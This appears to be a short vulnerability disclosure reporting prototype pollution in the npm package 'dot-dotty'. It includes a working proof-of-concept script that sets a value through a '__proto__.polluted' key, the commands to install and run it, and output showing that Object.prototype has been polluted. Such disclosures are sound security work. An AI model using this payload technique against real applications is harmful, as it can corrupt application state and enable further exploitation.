# Description

`dot-dotty` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
const DotDotty = require('dot-dotty')
let obj = {a: 1}
let dot = DotDotty(obj)
console.log("Before : " + {}.polluted);
dot['__proto__.polluted'] = 'Yes! Its Polluted';
console.log("After : " + {}.polluted);
```


2. Execute the following commands in terminal:

```
npm i dot-dotty # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
